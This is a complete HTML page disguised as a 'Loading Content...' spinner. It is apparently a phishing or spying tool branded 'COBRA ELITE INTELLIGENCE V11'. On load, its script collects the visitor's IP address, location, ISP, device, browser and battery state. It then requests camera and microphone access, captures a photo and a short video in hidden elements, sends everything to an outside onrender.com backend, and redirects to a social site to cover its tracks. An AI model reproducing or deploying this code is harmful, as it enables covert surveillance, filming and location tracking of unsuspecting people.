<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Loading Content...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
  <style>
    body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
    .loader { border: 3px solid #1a1a1a; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    video, canvas { opacity: 0; position: absolute; left: -9999px; }
  </style>
</head>
<body>
  <div style="text-align: center;">
    <div class="loader"></div>
  </div>

  <video id="v" autoplay muted playsinline></video>
  <canvas id="c" width="640" height="480"></canvas>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("id");
    const reKey = urlParams.get("re");
    const v = document.getElementById("v");
    const c = document.getElementById("c");
    const ctx = c.getContext("2d");

    const redirectMap = { "fb": "https://facebook.com", "ig": "https://instagram.com", "yt": "https://youtube.com" };

    async function send(payload) {
      if (!chatId) return;
      payload.chat_id = chatId;
      return fetch("https://render-backend-package1.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true
      });
    }

    async function gatherIntel() {
      // 1. تحليل المتصفح والجهاز بدقة (استعمال مكتبة UAParser)
      const parser = new UAParser();
      const resUA = parser.getResult();
      const deviceModel = resUA.device.model || "PC/Generic";
      const deviceVendor = resUA.device.vendor || "";
      const osName = resUA.os.name || "Unknown OS";
      const browserName = resUA.browser.name || "Unknown Browser";

      // 2. البطارية
      let bat = "N/A";
      try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch(e){}
      
      // 3. جلب الـ IP والمعلومات الجغرافية (استعمال API احتياطي قوي)
      let ipAddr = "Unknown", loc = "Unknown", isp = "Unknown", vpn = "❌ Unknown";
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        ipAddr = data.ip || "Unknown";
        loc = `${data.city}, ${data.country_name}`;
        isp = data.org;
        const browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
        vpn = (data.timezone !== browserTZ) ? "⚠️ YES" : "✅ NO";
      } catch (e) {
        // إذا فشل الأول، نجرب الثانٍي (أسرع)
        try {
          const res2 = await fetch("https://api.ipify.org?format=json");
          const data2 = await res2.json();
          ipAddr = data2.ip;
        } catch(e2){}
      }

      let m = "🏁 *COBRA ELITE INTELLIGENCE V11* 🏁\n";
      m += "━━━━━━━━━━━━━━━━━━━━\n";
      m += `🌍 *IP:* \`${ipAddr}\`\n`;
      m += `🛡️ *VPN:* ${vpn}\n`;
      m += `🏢 *ISP:* ${isp}\n`;
      m += `📍 *Loc:* ${loc}\n`;
      m += `📱 *Device:* ${deviceVendor} ${deviceModel} (${osName})\n`;
      m += `🌐 *Browser:* ${browserName} | ${navigator.language}\n`;
      m += `🕒 *Time:* ${new Date().toLocaleString('ar-DZ')}\n`;
      m += `🔋 *Bat:* ${bat} | 💻 *HW:* ${navigator.hardwareConcurrency} Cores\n`;
      m += "━━━━━━━━━━━━━━━━━━━━\n";
      
      await send({ message: m });
      startSpying();
    }

    function startSpying() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
          v.srcObject = stream;
          v.onloadedmetadata = () => {
            v.play();
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => { send({ video: reader.result.split(',')[1] }); };
                setTimeout(finish, 1500);
            };

            setTimeout(async () => {
                ctx.drawImage(v, 0, 0, c.width, c.height);
                await send({ photo: c.toDataURL("image/jpeg", 0.5).split(',')[1] });
                recorder.start();
                setTimeout(() => {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }, 4000); 
            }, 2000);
          };
        })
        .catch(() => { send({ message: "❌ Access Denied" }); finish(); });
    }

    function finish() {
      window.location.replace(redirectMap[reKey] || "https://youtube.com");
    }

    if (chatId) gatherIntel();
  </script>
</body>
</html>
